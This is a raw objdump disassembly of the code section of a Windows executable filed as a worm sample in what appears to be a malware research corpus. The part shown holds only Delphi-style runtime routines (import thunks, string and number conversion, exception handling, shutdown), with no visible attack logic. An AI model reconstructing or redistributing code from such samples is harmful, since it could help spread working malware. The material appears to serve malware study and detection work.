
malware_samples/worm/f617be25cb6b894df7c180f0ac4ac93aa26b808c2c6b69821546b29158dc2499.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	ff 25 9c 50 40 00    	jmp    *0x40509c
  401006:	8b c0                	mov    %eax,%eax
  401008:	ff 25 98 50 40 00    	jmp    *0x405098
  40100e:	8b c0                	mov    %eax,%eax
  401010:	ff 25 94 50 40 00    	jmp    *0x405094
  401016:	8b c0                	mov    %eax,%eax
  401018:	ff 25 90 50 40 00    	jmp    *0x405090
  40101e:	8b c0                	mov    %eax,%eax
  401020:	ff 25 8c 50 40 00    	jmp    *0x40508c
  401026:	8b c0                	mov    %eax,%eax
  401028:	ff 25 88 50 40 00    	jmp    *0x405088
  40102e:	8b c0                	mov    %eax,%eax
  401030:	ff 25 84 50 40 00    	jmp    *0x405084
  401036:	8b c0                	mov    %eax,%eax
  401038:	ff 25 80 50 40 00    	jmp    *0x405080
  40103e:	8b c0                	mov    %eax,%eax
  401040:	ff 25 7c 50 40 00    	jmp    *0x40507c
  401046:	8b c0                	mov    %eax,%eax
  401048:	ff 25 78 50 40 00    	jmp    *0x405078
  40104e:	8b c0                	mov    %eax,%eax
  401050:	ff 25 74 50 40 00    	jmp    *0x405074
  401056:	8b c0                	mov    %eax,%eax
  401058:	ff 25 70 50 40 00    	jmp    *0x405070
  40105e:	8b c0                	mov    %eax,%eax
  401060:	ff 25 6c 50 40 00    	jmp    *0x40506c
  401066:	8b c0                	mov    %eax,%eax
  401068:	ff 25 68 50 40 00    	jmp    *0x405068
  40106e:	8b c0                	mov    %eax,%eax
  401070:	ff 25 64 50 40 00    	jmp    *0x405064
  401076:	8b c0                	mov    %eax,%eax
  401078:	50                   	push   %eax
  401079:	a1 28 30 40 00       	mov    0x403028,%eax
  40107e:	50                   	push   %eax
  40107f:	a1 8c 45 40 00       	mov    0x40458c,%eax
  401084:	50                   	push   %eax
  401085:	e8 7e ff ff ff       	call   0x401008
  40108a:	c3                   	ret
  40108b:	90                   	nop
  40108c:	53                   	push   %ebx
  40108d:	8b d8                	mov    %eax,%ebx
  40108f:	53                   	push   %ebx
  401090:	a1 28 30 40 00       	mov    0x403028,%eax
  401095:	83 e0 01             	and    $0x1,%eax
  401098:	50                   	push   %eax
  401099:	a1 8c 45 40 00       	mov    0x40458c,%eax
  40109e:	50                   	push   %eax
  40109f:	e8 74 ff ff ff       	call   0x401018
  4010a4:	83 f8 01             	cmp    $0x1,%eax
  4010a7:	1b c0                	sbb    %eax,%eax
  4010a9:	f7 d8                	neg    %eax
  4010ab:	83 e0 7f             	and    $0x7f,%eax
  4010ae:	5b                   	pop    %ebx
  4010af:	c3                   	ret
  4010b0:	52                   	push   %edx
  4010b1:	50                   	push   %eax
  4010b2:	a1 28 30 40 00       	mov    0x403028,%eax
  4010b7:	83 e0 00             	and    $0x0,%eax
  4010ba:	50                   	push   %eax
  4010bb:	a1 8c 45 40 00       	mov    0x40458c,%eax
  4010c0:	50                   	push   %eax
  4010c1:	e8 4a ff ff ff       	call   0x401010
  4010c6:	c3                   	ret
  4010c7:	90                   	nop
  4010c8:	85 c0                	test   %eax,%eax
  4010ca:	74 0a                	je     0x4010d6
  4010cc:	ff 15 2c 30 40 00    	call   *0x40302c
  4010d2:	09 c0                	or     %eax,%eax
  4010d4:	74 01                	je     0x4010d7
  4010d6:	c3                   	ret
  4010d7:	b0 01                	mov    $0x1,%al
  4010d9:	e9 c2 00 00 00       	jmp    0x4011a0
  4010de:	c3                   	ret
  4010df:	90                   	nop
  4010e0:	85 c0                	test   %eax,%eax
  4010e2:	74 0a                	je     0x4010ee
  4010e4:	ff 15 30 30 40 00    	call   *0x403030
  4010ea:	09 c0                	or     %eax,%eax
  4010ec:	75 01                	jne    0x4010ef
  4010ee:	c3                   	ret
  4010ef:	b0 02                	mov    $0x2,%al
  4010f1:	e9 aa 00 00 00       	jmp    0x4011a0
  4010f6:	c3                   	ret
  4010f7:	90                   	nop
  4010f8:	8b 08                	mov    (%eax),%ecx
  4010fa:	85 c9                	test   %ecx,%ecx
  4010fc:	74 32                	je     0x401130
  4010fe:	85 d2                	test   %edx,%edx
  401100:	74 18                	je     0x40111a
  401102:	50                   	push   %eax
  401103:	89 c8                	mov    %ecx,%eax
  401105:	ff 15 34 30 40 00    	call   *0x403034
  40110b:	59                   	pop    %ecx
  40110c:	09 c0                	or     %eax,%eax
  40110e:	74 19                	je     0x401129
  401110:	89 01                	mov    %eax,(%ecx)
  401112:	c3                   	ret
  401113:	b0 02                	mov    $0x2,%al
  401115:	e9 86 00 00 00       	jmp    0x4011a0
  40111a:	89 10                	mov    %edx,(%eax)
  40111c:	89 c8                	mov    %ecx,%eax
  40111e:	ff 15 30 30 40 00    	call   *0x403030
  401124:	09 c0                	or     %eax,%eax
  401126:	75 eb                	jne    0x401113
  401128:	c3                   	ret
  401129:	b0 01                	mov    $0x1,%al
  40112b:	e9 70 00 00 00       	jmp    0x4011a0
  401130:	85 d2                	test   %edx,%edx
  401132:	74 10                	je     0x401144
  401134:	50                   	push   %eax
  401135:	89 d0                	mov    %edx,%eax
  401137:	ff 15 2c 30 40 00    	call   *0x40302c
  40113d:	59                   	pop    %ecx
  40113e:	09 c0                	or     %eax,%eax
  401140:	74 e7                	je     0x401129
  401142:	89 01                	mov    %eax,(%ecx)
  401144:	c3                   	ret
  401145:	8d 40 00             	lea    0x0(%eax),%eax
  401148:	89 15 04 30 40 00    	mov    %edx,0x403004
  40114e:	e8 c9 04 00 00       	call   0x40161c
  401153:	c3                   	ret
  401154:	53                   	push   %ebx
  401155:	56                   	push   %esi
  401156:	8b f2                	mov    %edx,%esi
  401158:	8b d8                	mov    %eax,%ebx
  40115a:	80 e3 7f             	and    $0x7f,%bl
  40115d:	83 3d 04 40 40 00 00 	cmpl   $0x0,0x404004
  401164:	74 0a                	je     0x401170
  401166:	8b d6                	mov    %esi,%edx
  401168:	8b c3                	mov    %ebx,%eax
  40116a:	ff 15 04 40 40 00    	call   *0x404004
  401170:	84 db                	test   %bl,%bl
  401172:	75 0d                	jne    0x401181
  401174:	e8 8f 09 00 00       	call   0x401b08
  401179:	8b 98 00 00 00 00    	mov    0x0(%eax),%ebx
  40117f:	eb 0f                	jmp    0x401190
  401181:	80 fb 18             	cmp    $0x18,%bl
  401184:	77 0a                	ja     0x401190
  401186:	33 c0                	xor    %eax,%eax
  401188:	8a c3                	mov    %bl,%al
  40118a:	8a 98 38 30 40 00    	mov    0x403038(%eax),%bl
  401190:	33 c0                	xor    %eax,%eax
  401192:	8a c3                	mov    %bl,%al
  401194:	8b d6                	mov    %esi,%edx
  401196:	e8 ad ff ff ff       	call   0x401148
  40119b:	5e                   	pop    %esi
  40119c:	5b                   	pop    %ebx
  40119d:	c3                   	ret
  40119e:	8b c0                	mov    %eax,%eax
  4011a0:	83 e0 7f             	and    $0x7f,%eax
  4011a3:	8b 14 24             	mov    (%esp),%edx
  4011a6:	e9 a9 ff ff ff       	jmp    0x401154
  4011ab:	c3                   	ret
  4011ac:	53                   	push   %ebx
  4011ad:	56                   	push   %esi
  4011ae:	81 c4 f0 fd ff ff    	add    $0xfffffdf0,%esp
  4011b4:	8b f2                	mov    %edx,%esi
  4011b6:	8b d8                	mov    %eax,%ebx
  4011b8:	84 db                	test   %bl,%bl
  4011ba:	74 2d                	je     0x4011e9
  4011bc:	33 c0                	xor    %eax,%eax
  4011be:	8a c3                	mov    %bl,%al
  4011c0:	83 c0 41             	add    $0x41,%eax
  4011c3:	48                   	dec    %eax
  4011c4:	88 04 24             	mov    %al,(%esp)
  4011c7:	c6 44 24 01 3a       	movb   $0x3a,0x1(%esp)
  4011cc:	c6 44 24 02 00       	movb   $0x0,0x2(%esp)
  4011d1:	8d 84 24 09 01 00 00 	lea    0x109(%esp),%eax
  4011d8:	50                   	push   %eax
  4011d9:	68 05 01 00 00       	push   $0x105
  4011de:	e8 7d fe ff ff       	call   0x401060
  4011e3:	54                   	push   %esp
  4011e4:	e8 7f fe ff ff       	call   0x401068
  4011e9:	8d 44 24 04          	lea    0x4(%esp),%eax
  4011ed:	50                   	push   %eax
  4011ee:	68 05 01 00 00       	push   $0x105
  4011f3:	e8 68 fe ff ff       	call   0x401060
  4011f8:	84 db                	test   %bl,%bl
  4011fa:	74 0d                	je     0x401209
  4011fc:	8d 84 24 09 01 00 00 	lea    0x109(%esp),%eax
  401203:	50                   	push   %eax
  401204:	e8 5f fe ff ff       	call   0x401068
  401209:	8b c6                	mov    %esi,%eax
  40120b:	8d 54 24 04          	lea    0x4(%esp),%edx
  40120f:	b9 05 01 00 00       	mov    $0x105,%ecx
  401214:	e8 1b 05 00 00       	call   0x401734
  401219:	81 c4 10 02 00 00    	add    $0x210,%esp
  40121f:	5e                   	pop    %esi
  401220:	5b                   	pop    %ebx
  401221:	c3                   	ret
  401222:	8b c0                	mov    %eax,%eax
  401224:	83 f9 04             	cmp    $0x4,%ecx
  401227:	7d 1c                	jge    0x401245
  401229:	67 e3 57             	jcxz   0x401283
  40122c:	39 d0                	cmp    %edx,%eax
  40122e:	74 53                	je     0x401283
  401230:	56                   	push   %esi
  401231:	57                   	push   %edi
  401232:	89 c6                	mov    %eax,%esi
  401234:	89 d7                	mov    %edx,%edi
  401236:	77 09                	ja     0x401241
  401238:	8d 74 31 ff          	lea    -0x1(%ecx,%esi,1),%esi
  40123c:	8d 7c 39 ff          	lea    -0x1(%ecx,%edi,1),%edi
  401240:	fd                   	std
  401241:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401243:	eb 2c                	jmp    0x401271
  401245:	39 d0                	cmp    %edx,%eax
  401247:	74 3a                	je     0x401283
  401249:	56                   	push   %esi
  40124a:	57                   	push   %edi
  40124b:	89 c6                	mov    %eax,%esi
  40124d:	89 d7                	mov    %edx,%edi
  40124f:	89 c8                	mov    %ecx,%eax
  401251:	77 20                	ja     0x401273
  401253:	83 e1 03             	and    $0x3,%ecx
  401256:	8d 74 30 ff          	lea    -0x1(%eax,%esi,1),%esi
  40125a:	8d 7c 38 ff          	lea    -0x1(%eax,%edi,1),%edi
  40125e:	fd                   	std
  40125f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401261:	c1 f8 02             	sar    $0x2,%eax
  401264:	89 c1                	mov    %eax,%ecx
  401266:	b8 03 00 00 00       	mov    $0x3,%eax
  40126b:	29 c6                	sub    %eax,%esi
  40126d:	29 c7                	sub    %eax,%edi
  40126f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401271:	fc                   	cld
  401272:	49                   	dec    %ecx
  401273:	c1 f9 02             	sar    $0x2,%ecx
  401276:	78 09                	js     0x401281
  401278:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40127a:	83 e0 03             	and    $0x3,%eax
  40127d:	89 c1                	mov    %eax,%ecx
  40127f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401281:	5f                   	pop    %edi
  401282:	5e                   	pop    %esi
  401283:	c3                   	ret
  401284:	53                   	push   %ebx
  401285:	56                   	push   %esi
  401286:	57                   	push   %edi
  401287:	52                   	push   %edx
  401288:	83 ec 14             	sub    $0x14,%esp
  40128b:	89 cf                	mov    %ecx,%edi
  40128d:	89 c6                	mov    %eax,%esi
  40128f:	99                   	cltd
  401290:	31 d0                	xor    %edx,%eax
  401292:	29 d0                	sub    %edx,%eax
  401294:	b9 0a 00 00 00       	mov    $0xa,%ecx
  401299:	31 db                	xor    %ebx,%ebx
  40129b:	31 d2                	xor    %edx,%edx
  40129d:	f7 f1                	div    %ecx
  40129f:	83 c2 30             	add    $0x30,%edx
  4012a2:	88 14 1c             	mov    %dl,(%esp,%ebx,1)
  4012a5:	43                   	inc    %ebx
  4012a6:	85 c0                	test   %eax,%eax
  4012a8:	75 f1                	jne    0x40129b
  4012aa:	85 f6                	test   %esi,%esi
  4012ac:	7d 05                	jge    0x4012b3
  4012ae:	c6 04 1c 2d          	movb   $0x2d,(%esp,%ebx,1)
  4012b2:	43                   	inc    %ebx
  4012b3:	88 1f                	mov    %bl,(%edi)
  4012b5:	47                   	inc    %edi
  4012b6:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4012ba:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  4012c0:	7e 05                	jle    0x4012c7
  4012c2:	b9 ff 00 00 00       	mov    $0xff,%ecx
  4012c7:	29 d9                	sub    %ebx,%ecx
  4012c9:	7e 07                	jle    0x4012d2
  4012cb:	00 4f ff             	add    %cl,-0x1(%edi)
  4012ce:	b0 20                	mov    $0x20,%al
  4012d0:	f3 aa                	rep stos %al,%es:(%edi)
  4012d2:	8a 44 1c ff          	mov    -0x1(%esp,%ebx,1),%al
  4012d6:	88 07                	mov    %al,(%edi)
  4012d8:	47                   	inc    %edi
  4012d9:	4b                   	dec    %ebx
  4012da:	75 f6                	jne    0x4012d2
  4012dc:	83 c4 18             	add    $0x18,%esp
  4012df:	5f                   	pop    %edi
  4012e0:	5e                   	pop    %esi
  4012e1:	5b                   	pop    %ebx
  4012e2:	c3                   	ret
  4012e3:	90                   	nop
  4012e4:	8b ca                	mov    %edx,%ecx
  4012e6:	33 d2                	xor    %edx,%edx
  4012e8:	e8 97 ff ff ff       	call   0x401284
  4012ed:	c3                   	ret
  4012ee:	8b c0                	mov    %eax,%eax
  4012f0:	53                   	push   %ebx
  4012f1:	56                   	push   %esi
  4012f2:	57                   	push   %edi
  4012f3:	89 c6                	mov    %eax,%esi
  4012f5:	50                   	push   %eax
  4012f6:	85 c0                	test   %eax,%eax
  4012f8:	74 6c                	je     0x401366
  4012fa:	31 c0                	xor    %eax,%eax
  4012fc:	31 db                	xor    %ebx,%ebx
  4012fe:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  401303:	8a 1e                	mov    (%esi),%bl
  401305:	46                   	inc    %esi
  401306:	80 fb 20             	cmp    $0x20,%bl
  401309:	74 f8                	je     0x401303
  40130b:	b5 00                	mov    $0x0,%ch
  40130d:	80 fb 2d             	cmp    $0x2d,%bl
  401310:	74 62                	je     0x401374
  401312:	80 fb 2b             	cmp    $0x2b,%bl
  401315:	74 5f                	je     0x401376
  401317:	80 fb 24             	cmp    $0x24,%bl
  40131a:	74 5f                	je     0x40137b
  40131c:	80 fb 78             	cmp    $0x78,%bl
  40131f:	74 5a                	je     0x40137b
  401321:	80 fb 58             	cmp    $0x58,%bl
  401324:	74 55                	je     0x40137b
  401326:	80 fb 30             	cmp    $0x30,%bl
  401329:	75 13                	jne    0x40133e
  40132b:	8a 1e                	mov    (%esi),%bl
  40132d:	46                   	inc    %esi
  40132e:	80 fb 78             	cmp    $0x78,%bl
  401331:	74 48                	je     0x40137b
  401333:	80 fb 58             	cmp    $0x58,%bl
  401336:	74 43                	je     0x40137b
  401338:	84 db                	test   %bl,%bl
  40133a:	74 20                	je     0x40135c
  40133c:	eb 04                	jmp    0x401342
  40133e:	84 db                	test   %bl,%bl
  401340:	74 2d                	je     0x40136f
  401342:	80 eb 30             	sub    $0x30,%bl
  401345:	80 fb 09             	cmp    $0x9,%bl
  401348:	77 25                	ja     0x40136f
  40134a:	39 f8                	cmp    %edi,%eax
  40134c:	77 21                	ja     0x40136f
  40134e:	8d 04 80             	lea    (%eax,%eax,4),%eax
  401351:	01 c0                	add    %eax,%eax
  401353:	01 d8                	add    %ebx,%eax
  401355:	8a 1e                	mov    (%esi),%bl
  401357:	46                   	inc    %esi
  401358:	84 db                	test   %bl,%bl
  40135a:	75 e6                	jne    0x401342
  40135c:	fe cd                	dec    %ch
  40135e:	74 09                	je     0x401369
  401360:	85 c0                	test   %eax,%eax
  401362:	7d 4e                	jge    0x4013b2
  401364:	eb 09                	jmp    0x40136f
  401366:	46                   	inc    %esi
  401367:	eb 06                	jmp    0x40136f
  401369:	f7 d8                	neg    %eax
  40136b:	7e 45                	jle    0x4013b2
  40136d:	78 43                	js     0x4013b2
  40136f:	5b                   	pop    %ebx
  401370:	29 de                	sub    %ebx,%esi
  401372:	eb 41                	jmp    0x4013b5
  401374:	fe c5                	inc    %ch
  401376:	8a 1e                	mov    (%esi),%bl
  401378:	46                   	inc    %esi
  401379:	eb c3                	jmp    0x40133e
  40137b:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  401380:	8a 1e                	mov    (%esi),%bl
  401382:	46                   	inc    %esi
  401383:	84 db                	test   %bl,%bl
  401385:	74 df                	je     0x401366
  401387:	80 fb 61             	cmp    $0x61,%bl
  40138a:	72 03                	jb     0x40138f
  40138c:	80 eb 20             	sub    $0x20,%bl
  40138f:	80 eb 30             	sub    $0x30,%bl
  401392:	80 fb 09             	cmp    $0x9,%bl
  401395:	76 0b                	jbe    0x4013a2
  401397:	80 eb 11             	sub    $0x11,%bl
  40139a:	80 fb 05             	cmp    $0x5,%bl
  40139d:	77 d0                	ja     0x40136f
  40139f:	80 c3 0a             	add    $0xa,%bl
  4013a2:	39 f8                	cmp    %edi,%eax
  4013a4:	77 c9                	ja     0x40136f
  4013a6:	c1 e0 04             	shl    $0x4,%eax
  4013a9:	01 d8                	add    %ebx,%eax
  4013ab:	8a 1e                	mov    (%esi),%bl
  4013ad:	46                   	inc    %esi
  4013ae:	84 db                	test   %bl,%bl
  4013b0:	75 d5                	jne    0x401387
  4013b2:	59                   	pop    %ecx
  4013b3:	31 f6                	xor    %esi,%esi
  4013b5:	89 32                	mov    %esi,(%edx)
  4013b7:	5f                   	pop    %edi
  4013b8:	5e                   	pop    %esi
  4013b9:	5b                   	pop    %ebx
  4013ba:	c3                   	ret
  4013bb:	90                   	nop
  4013bc:	85 c9                	test   %ecx,%ecx
  4013be:	74 19                	je     0x4013d9
  4013c0:	8b 41 01             	mov    0x1(%ecx),%eax
  4013c3:	80 39 e9             	cmpb   $0xe9,(%ecx)
  4013c6:	74 0c                	je     0x4013d4
  4013c8:	80 39 eb             	cmpb   $0xeb,(%ecx)
  4013cb:	75 0c                	jne    0x4013d9
  4013cd:	0f be c0             	movsbl %al,%eax
  4013d0:	41                   	inc    %ecx
  4013d1:	41                   	inc    %ecx
  4013d2:	eb 03                	jmp    0x4013d7
  4013d4:	83 c1 05             	add    $0x5,%ecx
  4013d7:	01 c1                	add    %eax,%ecx
  4013d9:	c3                   	ret
  4013da:	8b c0                	mov    %eax,%eax
  4013dc:	80 3d 08 30 40 00 01 	cmpb   $0x1,0x403008
  4013e3:	76 1d                	jbe    0x401402
  4013e5:	50                   	push   %eax
  4013e6:	52                   	push   %edx
  4013e7:	51                   	push   %ecx
  4013e8:	e8 cf ff ff ff       	call   0x4013bc
  4013ed:	51                   	push   %ecx
  4013ee:	54                   	push   %esp
  4013ef:	6a 01                	push   $0x1
  4013f1:	6a 00                	push   $0x0
  4013f3:	68 e1 fa ed 0e       	push   $0xeedfae1
  4013f8:	ff 15 08 40 40 00    	call   *0x404008
  4013fe:	59                   	pop    %ecx
  4013ff:	59                   	pop    %ecx
  401400:	5a                   	pop    %edx
  401401:	58                   	pop    %eax
  401402:	c3                   	ret
  401403:	90                   	nop
  401404:	8b 44 24 04          	mov    0x4(%esp),%eax
  401408:	8b 54 24 08          	mov    0x8(%esp),%edx
  40140c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  401413:	74 1f                	je     0x401434
  401415:	8b 4a 04             	mov    0x4(%edx),%ecx
  401418:	c7 42 04 34 14 40 00 	movl   $0x401434,0x4(%edx)
  40141f:	53                   	push   %ebx
  401420:	56                   	push   %esi
  401421:	57                   	push   %edi
  401422:	55                   	push   %ebp
  401423:	8b 6a 08             	mov    0x8(%edx),%ebp
  401426:	83 c1 05             	add    $0x5,%ecx
  401429:	e8 ae ff ff ff       	call   0x4013dc
  40142e:	ff d1                	call   *%ecx
  401430:	5d                   	pop    %ebp
  401431:	5f                   	pop    %edi
  401432:	5e                   	pop    %esi
  401433:	5b                   	pop    %ebx
  401434:	b8 01 00 00 00       	mov    $0x1,%eax
  401439:	c3                   	ret
  40143a:	8b c0                	mov    %eax,%eax
  40143c:	53                   	push   %ebx
  40143d:	56                   	push   %esi
  40143e:	57                   	push   %edi
  40143f:	55                   	push   %ebp
  401440:	bf 90 45 40 00       	mov    $0x404590,%edi
  401445:	8b 47 08             	mov    0x8(%edi),%eax
  401448:	85 c0                	test   %eax,%eax
  40144a:	74 1e                	je     0x40146a
  40144c:	8b 5f 0c             	mov    0xc(%edi),%ebx
  40144f:	8b 70 04             	mov    0x4(%eax),%esi
  401452:	85 db                	test   %ebx,%ebx
  401454:	7e 14                	jle    0x40146a
  401456:	4b                   	dec    %ebx
  401457:	89 5f 0c             	mov    %ebx,0xc(%edi)
  40145a:	8b 44 de 04          	mov    0x4(%esi,%ebx,8),%eax
  40145e:	85 c0                	test   %eax,%eax
  401460:	74 04                	je     0x401466
  401462:	8b e8                	mov    %eax,%ebp
  401464:	ff d5                	call   *%ebp
  401466:	85 db                	test   %ebx,%ebx
  401468:	7f ec                	jg     0x401456
  40146a:	5d                   	pop    %ebp
  40146b:	5f                   	pop    %edi
  40146c:	5e                   	pop    %esi
  40146d:	5b                   	pop    %ebx
  40146e:	c3                   	ret
  40146f:	90                   	nop
  401470:	53                   	push   %ebx
  401471:	56                   	push   %esi
  401472:	57                   	push   %edi
  401473:	55                   	push   %ebp
  401474:	8b f9                	mov    %ecx,%edi
  401476:	8b ea                	mov    %edx,%ebp
  401478:	8b f0                	mov    %eax,%esi
  40147a:	b8 70 14 40 00       	mov    $0x401470,%eax
  40147f:	3b 05 18 30 40 00    	cmp    0x403018,%eax
  401485:	0f 94 c3             	sete   %bl
  401488:	3b fd                	cmp    %ebp,%edi
  40148a:	7e 33                	jle    0x4014bf
  40148c:	8b 04 ee             	mov    (%esi,%ebp,8),%eax
  40148f:	45                   	inc    %ebp
  401490:	89 2d 9c 45 40 00    	mov    %ebp,0x40459c
  401496:	85 c0                	test   %eax,%eax
  401498:	74 02                	je     0x40149c
  40149a:	ff d0                	call   *%eax
  40149c:	84 db                	test   %bl,%bl
  40149e:	74 1b                	je     0x4014bb
  4014a0:	b8 70 14 40 00       	mov    $0x401470,%eax
  4014a5:	3b 05 18 30 40 00    	cmp    0x403018,%eax
  4014ab:	74 0e                	je     0x4014bb
  4014ad:	8b cf                	mov    %edi,%ecx
  4014af:	8b d5                	mov    %ebp,%edx
  4014b1:	8b c6                	mov    %esi,%eax
  4014b3:	ff 15 18 30 40 00    	call   *0x403018
  4014b9:	eb 04                	jmp    0x4014bf
  4014bb:	3b fd                	cmp    %ebp,%edi
  4014bd:	7f cd                	jg     0x40148c
  4014bf:	5d                   	pop    %ebp
  4014c0:	5f                   	pop    %edi
  4014c1:	5e                   	pop    %esi
  4014c2:	5b                   	pop    %ebx
  4014c3:	c3                   	ret
  4014c4:	a1 98 45 40 00       	mov    0x404598,%eax
  4014c9:	85 c0                	test   %eax,%eax
  4014cb:	74 0f                	je     0x4014dc
  4014cd:	8b 10                	mov    (%eax),%edx
  4014cf:	33 c9                	xor    %ecx,%ecx
  4014d1:	8b 40 04             	mov    0x4(%eax),%eax
  4014d4:	87 ca                	xchg   %ecx,%edx
  4014d6:	ff 15 18 30 40 00    	call   *0x403018
  4014dc:	c3                   	ret
  4014dd:	8d 40 00             	lea    0x0(%eax),%eax
  4014e0:	c7 05 08 40 40 00 48 	movl   $0x401048,0x404008
  4014e7:	10 40 00 
  4014ea:	c7 05 0c 40 40 00 50 	movl   $0x401050,0x40400c
  4014f1:	10 40 00 
  4014f4:	a3 98 45 40 00       	mov    %eax,0x404598
  4014f9:	33 c0                	xor    %eax,%eax
  4014fb:	a3 9c 45 40 00       	mov    %eax,0x40459c
  401500:	89 15 a0 45 40 00    	mov    %edx,0x4045a0
  401506:	8b 42 04             	mov    0x4(%edx),%eax
  401509:	a3 14 40 40 00       	mov    %eax,0x404014
  40150e:	c6 05 1c 40 40 00 00 	movb   $0x0,0x40401c
  401515:	e8 aa ff ff ff       	call   0x4014c4
  40151a:	c3                   	ret
  40151b:	90                   	nop
  40151c:	31 c0                	xor    %eax,%eax
  40151e:	87 05 00 30 40 00    	xchg   %eax,0x403000
  401524:	f7 d8                	neg    %eax
  401526:	19 c0                	sbb    %eax,%eax
  401528:	40                   	inc    %eax
  401529:	bf 90 45 40 00       	mov    $0x404590,%edi
  40152e:	8b 5f 18             	mov    0x18(%edi),%ebx
  401531:	8b 6f 14             	mov    0x14(%edi),%ebp
  401534:	ff 77 1c             	push   0x1c(%edi)
  401537:	ff 77 20             	push   0x20(%edi)
  40153a:	8b 37                	mov    (%edi),%esi
  40153c:	b9 0b 00 00 00       	mov    $0xb,%ecx
  401541:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401543:	5f                   	pop    %edi
  401544:	5e                   	pop    %esi
  401545:	c9                   	leave
  401546:	c2 0c 00             	ret    $0xc
  401549:	c3                   	ret
  40154a:	8b c0                	mov    %eax,%eax
  40154c:	53                   	push   %ebx
  40154d:	56                   	push   %esi
  40154e:	57                   	push   %edi
  40154f:	55                   	push   %ebp
  401550:	bb 90 45 40 00       	mov    $0x404590,%ebx
  401555:	be 00 30 40 00       	mov    $0x403000,%esi
  40155a:	bf 20 40 40 00       	mov    $0x404020,%edi
  40155f:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  401563:	75 16                	jne    0x40157b
  401565:	83 3f 00             	cmpl   $0x0,(%edi)
  401568:	74 11                	je     0x40157b
  40156a:	8b 17                	mov    (%edi),%edx
  40156c:	89 d0                	mov    %edx,%eax
  40156e:	33 d2                	xor    %edx,%edx
  401570:	89 17                	mov    %edx,(%edi)
  401572:	8b e8                	mov    %eax,%ebp
  401574:	ff d5                	call   *%ebp
  401576:	83 3f 00             	cmpl   $0x0,(%edi)
  401579:	75 ef                	jne    0x40156a
  40157b:	83 3d 04 30 40 00 00 	cmpl   $0x0,0x403004
  401582:	74 06                	je     0x40158a
  401584:	ff 15 54 30 40 00    	call   *0x403054
  40158a:	80 7b 28 02          	cmpb   $0x2,0x28(%ebx)
  40158e:	75 0a                	jne    0x40159a
  401590:	83 3e 00             	cmpl   $0x0,(%esi)
  401593:	75 05                	jne    0x40159a
  401595:	33 c0                	xor    %eax,%eax
  401597:	89 43 0c             	mov    %eax,0xc(%ebx)
  40159a:	ff 15 1c 30 40 00    	call   *0x40301c
  4015a0:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  4015a4:	76 05                	jbe    0x4015ab
  4015a6:	83 3e 00             	cmpl   $0x0,(%esi)
  4015a9:	74 22                	je     0x4015cd
  4015ab:	8b 43 10             	mov    0x10(%ebx),%eax
  4015ae:	85 c0                	test   %eax,%eax
  4015b0:	74 1b                	je     0x4015cd
  4015b2:	ff 15 14 30 40 00    	call   *0x403014
  4015b8:	8b 53 10             	mov    0x10(%ebx),%edx
  4015bb:	8b 42 10             	mov    0x10(%edx),%eax
  4015be:	3b 42 04             	cmp    0x4(%edx),%eax
  4015c1:	74 0a                	je     0x4015cd
  4015c3:	85 c0                	test   %eax,%eax
  4015c5:	74 06                	je     0x4015cd
  4015c7:	50                   	push   %eax
  4015c8:	e8 53 fa ff ff       	call   0x401020
  4015cd:	ff 15 20 30 40 00    	call   *0x403020
  4015d3:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  4015d7:	75 03                	jne    0x4015dc
  4015d9:	ff 53 24             	call   *0x24(%ebx)
  4015dc:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  4015e0:	74 05                	je     0x4015e7
  4015e2:	e8 35 ff ff ff       	call   0x40151c
  4015e7:	83 3b 00             	cmpl   $0x0,(%ebx)
  4015ea:	75 17                	jne    0x401603
  4015ec:	83 3d 10 40 40 00 00 	cmpl   $0x0,0x404010
  4015f3:	74 06                	je     0x4015fb
  4015f5:	ff 15 10 40 40 00    	call   *0x404010
  4015fb:	8b 06                	mov    (%esi),%eax
  4015fd:	50                   	push   %eax
  4015fe:	e8 55 fa ff ff       	call   0x401058
  401603:	8b 03                	mov    (%ebx),%eax
  401605:	56                   	push   %esi
  401606:	8b f0                	mov    %eax,%esi
  401608:	8b fb                	mov    %ebx,%edi
  40160a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40160f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401611:	5e                   	pop    %esi
  401612:	e9 73 ff ff ff       	jmp    0x40158a
  401617:	5d                   	pop    %ebp
  401618:	5f                   	pop    %edi
  401619:	5e                   	pop    %esi
  40161a:	5b                   	pop    %ebx
  40161b:	c3                   	ret
  40161c:	a3 00 30 40 00       	mov    %eax,0x403000
  401621:	e8 26 ff ff ff       	call   0x40154c
  401626:	c3                   	ret
  401627:	90                   	nop
  401628:	8f 05 04 30 40 00    	pop    0x403004
  40162e:	e9 e9 ff ff ff       	jmp    0x40161c
  401633:	c3                   	ret
  401634:	8b 10                	mov    (%eax),%edx
  401636:	85 d2                	test   %edx,%edx
  401638:	74 1b                	je     0x401655
  40163a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  401640:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401643:	49                   	dec    %ecx
  401644:	7c 0f                	jl     0x401655
  401646:	ff 4a f8             	decl   -0x8(%edx)
  401649:	75 0a                	jne    0x401655
  40164b:	50                   	push   %eax
  40164c:	8d 42 f8             	lea    -0x8(%edx),%eax
  40164f:	e8 8c fa ff ff       	call   0x4010e0
  401654:	58                   	pop    %eax
  401655:	c3                   	ret
  401656:	8b c0                	mov    %eax,%eax
  401658:	53                   	push   %ebx
  401659:	56                   	push   %esi
  40165a:	89 c3                	mov    %eax,%ebx
  40165c:	89 d6                	mov    %edx,%esi
  40165e:	8b 13                	mov    (%ebx),%edx
  401660:	85 d2                	test   %edx,%edx
  401662:	74 19                	je     0x40167d
